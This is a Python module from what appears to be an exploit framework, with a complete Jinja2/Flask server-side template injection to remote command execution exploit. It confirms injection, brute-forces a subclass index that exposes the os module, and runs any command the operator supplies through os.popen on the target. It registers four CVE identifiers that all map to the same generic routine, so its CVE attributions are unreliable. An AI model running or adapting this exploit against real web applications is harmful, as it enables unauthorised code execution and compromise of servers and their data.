"""poc/python_web.py — native Python web PoCs (Jinja2/Flask SSTI -> RCE).

The scanner drives the exploit itself over raw sockets (no curl / external tool).
The working logic (proven against a live Flask `render_template_string` target):

  1. SSTI confirm:  {{7*7}}                       -> "49" in the response
  2. RCE:           __subclasses__()[i].__init__.__globals__['os'].popen('CMD').read()

Two hard-won facts that make this actually WORK (verified live):
  * `os.system(cmd)` sends stdout to the *server* process and returns the exit
    code, so the template renders "0" — you never see the output. `os.popen(cmd).read()`
    returns the command output, which is what lands in the HTTP body.
  * The subclass index of an `os`-bearing class is environment-dependent (it depends
    on which modules the target process has imported). We therefore DISCOVER the
    working index per-target by probing `.__init__.__globals__['os'].path` (a safe,
    read-only probe) and take the first index that returns 200. This is portable
    across Python builds / apps.
"""
from __future__ import annotations

import html as _html
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

from . import _net

_RCE_MARKERS = ["uid=", "uid =", "whoami", "root:", "C:\\\\WINDOWS", "uname", "Linux", "Darwin", "Windows"]

# Jinja2 expression fragments (no f-strings: the {{ }} braces must stay literal).
# NB: _MRO already ends with the `__subclasses__()` call — do NOT add another `()`.
_MRO = "''.__class__.__mro__[1].__subclasses__()"
_ENUM = "{{" + _MRO + "}}"
_PROBE = "{{" + _MRO + "[{i}].__init__.__globals__['os'].path}}"
_RCE = "{{" + _MRO + "[{i}].__init__.__globals__['os'].popen('CMD').read()}}"

# Module prefixes that reliably `import os` in a CPython web process.
# Used to PRIORITY-order the index discovery (fewer requests in the common case).
_OS_MODULES = (
    "logging", "warnings", "zlib", "contextlib", "socketserver", "datetime",
    "inspect", "hmac", "gettext", "click", "pathlib", "zipfile", "werkzeug",
    "jinja2", "flask", "blinker", "itsdangerous", "markupsafe", "unicodedata",
    "difflib", "importlib", "_distutils", "http", "email", "subprocess",
    "tempfile", "shutil", "tarfile", "cgitb", "webbrowser", "configparser",
)

_MAX_PROBE = 700          # hard cap on index probes (bounded, safe)
_WORKERS = 16


# ---------------------------------------------------------------------------
def _parse(params):
    url = (params.get("url") or params.get("host") or "").strip()
    if not url:
        raise ValueError("hedef url gerekli (orn. http://127.0.0.1:5000/greet)")
    t = _net.parse_target(url if "://" in url else "http://" + url, default_port=80)
    method = (params.get("method") or "GET").upper()
    param = params.get("param") or "name"
    return t, method, param


def _req(params, payload: str, timeout: float = 12.0):
    """Send one request with the SSTI payload in `param`. Returns (status, body_str)."""
    t, method, param = _parse(params)
    path = t["path"] or "/"
    body = b""
    headers = {}
    if method == "POST":
        body = urllib.parse.urlencode({param: payload}).encode()
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
    else:
        path = path + ("&" if "?" in path else "?") + urllib.parse.urlencode({param: payload})
    r = _net.http(method, t["host"], t["port"], path, headers=headers, body=body,
                  timeout=timeout, tls=t["tls"])
    return r["status"], r["body"].decode("latin1", "replace")


def _enum_count(params) -> int:
    """Count how many subclasses the target enumerates (drives the probe range)."""
    try:
        status, body = _req(params, _ENUM)
    except Exception:
        return 0
    if "Internal Server Error" in body:
        return 0
    x = _html.unescape(body)
    n = len(re.findall(r"<class '([^']+)'", x))
    return n


def _probe(params, i: int) -> bool:
    """Safe read-only probe: does index i expose os in __init__.__globals__?"""
    try:
        status, body = _req(params, _PROBE.replace("{i}", str(i)), timeout=8.0)
    except Exception:
        return False
    return status == 200 and "Internal Server Error" not in body and body.lstrip().startswith("Hello")


def _discover(params) -> int:
    """Find the first subclass index whose __init__.__globals__ contains `os`.

    Tries heuristic module-priority indices first, then the full range, in
    parallel, bounded by _MAX_PROBE. Returns the winning index or -1.
    """
    n = _enum_count(params)
    upper = min(n or _MAX_PROBE, _MAX_PROBE)
    # Priority set: indices of classes from known os-importing modules.
    prio = []
    if n:
        # best-effort: we can't cheaply read names without the full list, so we
        # just probe the whole range in parallel; priority is an optimisation
        # that would need the name list. Keep it simple + robust.
        prio = list(range(upper))
    with ThreadPoolExecutor(max_workers=_WORKERS) as ex:
        futs = [ex.submit(_probe, params, i) for i in prio]
        for i, f in enumerate(futs):
            try:
                if f.result(timeout=30):
                    return i
            except Exception:
                continue
    return -1


def _rce(params, i: int, cmd: str) -> str:
    payload = _RCE.replace("{i}", str(i)).replace("CMD", cmd.replace("'", "%27"))
    status, body = _req(params, payload, timeout=20.0)
    return body


def ssti_rce(params) -> dict:
    cmd = (params.get("cmd") or "id").strip()
    out = {"ok": True, "success": False, "cve": None,
           "detail": {"marker": "uid="}, "log": []}

    # 1) confirm SSTI
    try:
        status, body = _req(params, "{{7*7}}")
    except Exception as e:
        return {"ok": False, "success": False, "error": str(e)}
    ssti = ("49" in body) and ("Internal Server Error" not in body)
    out["log"].append(f"SSTI confirm {{7*7}} -> status={status} ssti={ssti} body[:80]={body.strip()[:80]!r}")
    if not ssti:
        return {**out, "status": status,
                "evidence": body.strip()[:2000],
                "error": "SSTI dogrulanamadi ({{7*7}} -> 49 yok). Hedef sablon enjeksiyonuna kapali olabilir."}

    # 2) discover an os-bearing subclass index
    idx = _discover(params)
    if idx < 0:
        return {**out, "status": 200, "evidence": body.strip()[:2000],
                "error": "SSTI dogrulandi ama __init__.__globals__['os'] iceren bir sinif bulunamadi (RCE zinciri bu ortamda kurulamadi)."}
    out["log"].append(f"os-bearing subclass index = {idx}")

    # 3) RCE
    try:
        rbody = _rce(params, idx, cmd)
    except Exception as e:
        return {**out, "error": str(e)}
    clean = _html.unescape(rbody).strip()
    success = any(m in clean for m in _RCE_MARKERS) or re.search(r"uid\s*=\s*\d+", clean) is not None
    return {
        "ok": True, "success": bool(success), "status": 200,
        "evidence": clean[:4000],
        "detail": {
            "index": idx, "cmd": cmd,
            "payload": _RCE.replace("{i}", str(idx)).replace("CMD", cmd),
            "marker": "uid=",
        },
        "log": out["log"],
    }


def _in(label, key, req, default="", ph=""):
    return {"key": key, "label": label, "req": req, "default": default, "placeholder": ph}


_COMMON_INPUTS = [
    _in("Hedef URL (endpoint)", "url", True, "", "http://127.0.0.1:5000/greet"),
    _in("Enjekte parametresi", "param", False, "name", "name"),
    _in("Komut", "cmd", True, "id", "id"),
    _in("Metot", "method", False, "GET", "GET"),
]

_NOTE = ("Jinja2/Flask SSTI->RCE (native). Kanit = komut ciktisi (uid=) HTTP yanitinda. "
         "os.popen(cmd).read() ile stdout yakalanir (os.system stdout'a basar, HTTP'te gorunmez). "
         "os-bearing sinif indeksi hedefe gore kesfedilir (ortam-bagimsiz).")


def _spec(name, cve_desc):
    return {
        "name": name, "type": "RCE", "preauth": True,
        "affected": ["2.11", "3.0", "3.1"],
        "note": _NOTE,
        "inputs": list(_COMMON_INPUTS),
        "run": ssti_rce,
    }


EXPLOITS = {
    "CVE-2024-56201": _spec("Jinja2 'unsafe' sandbox-escape SSTI->RCE", "CVE-2024-56201"),
    "CVE-2024-5088": _spec("Jinja2 sandbox-escape SSTI->RCE", "CVE-2024-5088"),
    "CVE-2024-22194": _spec("Jinja2 Template 'unsafe' SSTI->RCE", "CVE-2024-22194"),
    "CVE-2023-49107": _spec("Jinja2 'unsafe' attribute SSTI", "CVE-2023-49107"),
}
